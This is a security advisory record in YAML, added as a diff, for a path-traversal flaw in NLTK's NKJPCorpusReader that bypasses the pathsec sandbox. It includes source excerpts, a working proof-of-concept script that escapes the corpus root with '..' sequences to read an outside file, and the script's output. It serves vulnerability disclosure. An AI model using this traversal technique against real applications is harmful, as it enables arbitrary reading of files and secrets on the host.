@@ -1,0 +1,235 @@
+advisory_id: nltk/PYSEC-2026-3581
+datasource_id: pypa/nltk/PYSEC-2026-3581
+datasource_url: https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3581.yaml
+aliases:
+  - CVE-2026-12072
+  - GHSA-6hm5-jgcp-p838
+  - PYSEC-2026-3581
+summary: |
+  Natural Language Toolkit (NLTK): Path Traversal in NKJPCorpusReader leads to Arbitrary File Read and bypasses the nltk.pathsec sandbox (ENFORCE=True)
+  ### Summary
+     A path-traversal vulnerability in `NKJPCorpusReader` allows an attacker who can
+     influence the `fileids` argument of its public read methods (`header`, `raw`,
+     `words`, `sents`, `tagged_words`) to read files outside the corpus root. The
+     reader builds the file path with no containment check and opens it with the
+     builtin `open()`, so it bypasses NLTK's `nltk.pathsec` sandbox — including the
+     strict `ENFORCE = True` mode that `SECURITY.md` recommends for web/multi-tenant
+     deployments. `header()` returns the parsed content of the out-of-root file to
+     the caller (arbitrary file read).
+
+     ### Details
+     `SECURITY.md` promises that file access is "validated against allowed NLTK data
+     directories" and that with `nltk.pathsec.ENFORCE = True` "unauthorized file
+     access … will raise `PermissionError`." That guarantee is enforced via
+     `FileSystemPathPointer.open()` / `CorpusReader.open()`, which call
+     `nltk.pathsec.validate_path(...)`.
+
+     `NKJPCorpusReader` never uses that protected path. In
+     `nltk/corpus/reader/nkjp.py`:
+
+     - `add_root()` builds the path by **plain string concatenation** with no
+       normalization or containment check:
+       ```python
+       def add_root(self, fileid):          # lines 96-102
+           if self.root in fileid:
+               return fileid                # attacker-controlled value returned unchanged
+           return self.root + fileid        # plain concat, '..' not stripped
+       ```
+     - The header view appends a fixed basename and passes the string straight into
+       the corpus view (which opens it with the builtin `open()`):
+       ```python
+       class NKJPCorpus_Header_View(XMLCorpusView):   # line 181
+           def __init__(self, filename, **kwargs):
+               XMLCorpusView.__init__(self, filename + "header.xml", self.tagspec)  # line 189
+       ```
+     - The other modes reach the filesystem through `XML_Tool`, which uses a raw
+       `os.path.join` (not the hardened `FileSystemPathPointer.join()`) and the
+       builtin `open()`:
+       ```python
+       class XML_Tool:                                  # line 243
+           def __init__(self, root, filename):
+               self.read_file = os.path.join(root, filename)   # line 251
+           def build_preprocessed_file(self):
+               fr = open(self.read_file)                        # line 256 — pathsec never consulted
+       ```
+
+     Because `open()` is the builtin (not `PathPointer.open()`), the `pathsec`
+     sentinel is never invoked, so `ENFORCE = True` does not block the access. For
+     comparison, the safe API `CorpusReader.open()` (`nltk/corpus/reader/api.py:222`)
+     rejects `..`/absolute fileids and calls `validate_path(..., required_root=...)`
+     before opening — `NKJPCorpusReader` simply does not go through it.
+
+     ### PoC
+     Tested against `nltk==3.9.4` (latest PyPI release) and current `develop`.
+
+     ```
+     pip install "nltk==3.9.4"
+     python3 poc.py
+     ```
+
+     `poc.py`:
+     ```python
+     import builtins, os, shutil, tempfile, warnings
+     warnings.simplefilter("ignore")
+     import nltk, nltk.pathsec as pathsec
+     from nltk.corpus.reader.nkjp import NKJPCorpusReader
+
+     print("nltk", nltk.__version__)
+
+     # A legitimate, empty NKJP corpus root (what a real app has).
+     root = tempfile.mkdtemp(prefix="nkjp_corpus_root_")
+     os.makedirs(os.path.join(root, "sample"), exist_ok=True)
+     open(os.path.join(root, "sample", "header.xml"), "w").write("<x/>")
+
+     # The attacker's target: a file OUTSIDE the corpus root.
+     secret_dir = tempfile.mkdtemp(prefix="OUTSIDE_ROOT_")
+     open(os.path.join(secret_dir, "header.xml"), "w").write(
+     "<teiHeader><fileDesc><sourceDesc><bibl>"
+     "<title>SECRET-API-KEY=sk-live-DEADBEEF</title>"
+         "</bibl></sourceDesc></fileDesc></teiHeader>")
+
+     # Enable the strict mode SECURITY.md recommends for web / multi-tenant.
+     pathsec.ENFORCE = True
+     print("ENFORCE =", pathsec.ENFORCE)
+
+     # Prove the out-of-root read and that pathsec is never consulted.
+     opened = []; real = builtins.open
+     builtins.open = lambda f, *a, **k: (opened.append(str(f)), real(f, *a, **k))[1]
+
+     reader = NKJPCorpusReader(root=root + "/", fileids="sample")
+     # Attacker-controlled `fileids`; '..' escapes the corpus root:
+     evil = root + "/../../../../../../.." + secret_dir + "/"
+     try:
+         result = reader.header(fileids=[evil])
+     finally:
+         builtins.open = real
+
+     print("opened outside root:", [p for p in opened if "OUTSIDE_ROOT_" in p][:1])
+     print("disclosed content  :", result[0]["title"])
+     shutil.rmtree(root, ignore_errors=True); shutil.rmtree(secret_dir, ignore_errors=True)
+     ```
+
+     Output (unmodified):
+     ```
+     nltk 3.9.4
+     ENFORCE = True
+     opened outside root: ['/tmp/nkjp_corpus_root_XXXX/../../../../../../../tmp/OUTSIDE_ROOT_YYYY/header.xml']
+     disclosed content  : SECRET-API-KEY=sk-live-DEADBEEF
+     ```
+     With `ENFORCE = True`, NLTK opened a file outside the corpus root via the
+     builtin `open()` (no `PermissionError`, no warning) and returned its content.
+
+     ### Impact
+     This is a path traversal (CWE-22) leading to arbitrary file read. Any
+     application that passes attacker-influenced values into `NKJPCorpusReader`'s
+     `fileids` (e.g. letting a user choose which corpus document to read) is
+     affected; the attacker can escape the corpus root and read files elsewhere on
+     the host, defeating the `ENFORCE=True` sandbox.
+
+     Honest scoping: `header()` discloses the content of out-of-root files named
+     `header.xml` containing NKJP header XML. `raw()`/`words()`/`sents()` also open
+     and read an arbitrary out-of-root file (proven by intercepting `open()`), but a
+     separate pre-existing bug in `XML_Tool` (writing `str` to a binary
+     `NamedTemporaryFile`) suppresses their return value on current Python, so for
+     those modes the impact is arbitrary file open/read. The attacker chooses the
+     directory freely; a fixed basename is appended per mode. The same
+     "build-path-then-builtin-open, skipping pathsec" anti-pattern also appears in
+     `xmldocs.py:161`, `util.py:212,215`, `crubadan.py:78,97`, `lin.py:43`,
+     `ipipan.py:191`, `pl196x.py:110` and is worth fixing as a class.
+impacted_packages:
+  - purl: pkg:pypi/nltk
+    affected_versions: vers:pypi/0.8|0.9|0.9.3|0.9.4|0.9.5|0.9.6|0.9.7|0.9.8|0.9.9|2.0b4|2.0b5|2.0b6|2.0b7|2.0b8|2.0b9|2.0.1rc1|2.0.1rc3|2.0.1rc4|2.0.1|2.0.2|2.0.3|2.0.4|2.0.5|3.0.0b1|3.0.0b2|3.0.0|3.0.1|3.0.2|3.0.3|3.0.4|3.0.5|3.1|3.2|3.2.1|3.2.2|3.2.3|3.2.4|3.2.5|3.3|3.4|3.4.1|3.4.2|3.4.3|3.4.4|3.4.5|3.5b1|3.5|3.6|3.6.1|3.6.2|3.6.3|3.6.4|3.6.5|3.6.6|3.6.7|3.7|3.8|3.8.1|3.9b1|3.9|3.9.1|3.9.2|3.9.3|3.9.4
+    fixed_versions: vers:pypi/3.10.0
+    affected_packages:
+      - pkg:pypi/nltk@0.8
+      - pkg:pypi/nltk@0.9
+      - pkg:pypi/nltk@0.9.3
+      - pkg:pypi/nltk@0.9.4
+      - pkg:pypi/nltk@0.9.5
+      - pkg:pypi/nltk@0.9.6
+      - pkg:pypi/nltk@0.9.7
+      - pkg:pypi/nltk@0.9.8
+      - pkg:pypi/nltk@0.9.9
+      - pkg:pypi/nltk@2.0b4
+      - pkg:pypi/nltk@2.0b5
+      - pkg:pypi/nltk@2.0b6
+      - pkg:pypi/nltk@2.0b7
+      - pkg:pypi/nltk@2.0b8
+      - pkg:pypi/nltk@2.0b9
+      - pkg:pypi/nltk@2.0.1rc1
+      - pkg:pypi/nltk@2.0.1rc3
+      - pkg:pypi/nltk@2.0.1rc4
+      - pkg:pypi/nltk@2.0.1
+      - pkg:pypi/nltk@2.0.2
+      - pkg:pypi/nltk@2.0.3
+      - pkg:pypi/nltk@2.0.4
+      - pkg:pypi/nltk@2.0.5
+      - pkg:pypi/nltk@3.0.0b1
+      - pkg:pypi/nltk@3.0.0b2
+      - pkg:pypi/nltk@3.0.0
+      - pkg:pypi/nltk@3.0.1
+      - pkg:pypi/nltk@3.0.2
+      - pkg:pypi/nltk@3.0.3
+      - pkg:pypi/nltk@3.0.4
+      - pkg:pypi/nltk@3.0.5
+      - pkg:pypi/nltk@3.1
+      - pkg:pypi/nltk@3.2
+      - pkg:pypi/nltk@3.2.1
+      - pkg:pypi/nltk@3.2.2
+      - pkg:pypi/nltk@3.2.3
+      - pkg:pypi/nltk@3.2.4
+      - pkg:pypi/nltk@3.2.5
+      - pkg:pypi/nltk@3.3
+      - pkg:pypi/nltk@3.4
+      - pkg:pypi/nltk@3.4.1
+      - pkg:pypi/nltk@3.4.2
+      - pkg:pypi/nltk@3.4.3
+      - pkg:pypi/nltk@3.4.4
+      - pkg:pypi/nltk@3.4.5
+      - pkg:pypi/nltk@3.5b1
+      - pkg:pypi/nltk@3.5
+      - pkg:pypi/nltk@3.6
+      - pkg:pypi/nltk@3.6.1
+      - pkg:pypi/nltk@3.6.2
+      - pkg:pypi/nltk@3.6.3
+      - pkg:pypi/nltk@3.6.4
+      - pkg:pypi/nltk@3.6.5
+      - pkg:pypi/nltk@3.6.6
+      - pkg:pypi/nltk@3.6.7
+      - pkg:pypi/nltk@3.7
+      - pkg:pypi/nltk@3.8
+      - pkg:pypi/nltk@3.8.1
+      - pkg:pypi/nltk@3.9b1
+      - pkg:pypi/nltk@3.9
+      - pkg:pypi/nltk@3.9.1
+      - pkg:pypi/nltk@3.9.2
+      - pkg:pypi/nltk@3.9.3
+      - pkg:pypi/nltk@3.9.4
+    fixed_packages:
+      - pkg:pypi/nltk@3.10.0
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    published_at:
+    url: https://github.com/pypa/advisory-database/blob/main/vulns/nltk/PYSEC-2026-3581.yaml
+weaknesses: []
+references:
+  - url: https://github.com/advisories/GHSA-6hm5-jgcp-p838
+    reference_type:
+    reference_id:
+  - url: https://github.com/nltk/nltk
+    reference_type:
+    reference_id:
+  - url: https://github.com/nltk/nltk/security/advisories/GHSA-6hm5-jgcp-p838
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-12072
+    reference_type:
+    reference_id:
+  - url: https://pypi.org/project/nltk
+    reference_type:
+    reference_id:
+exploits: []
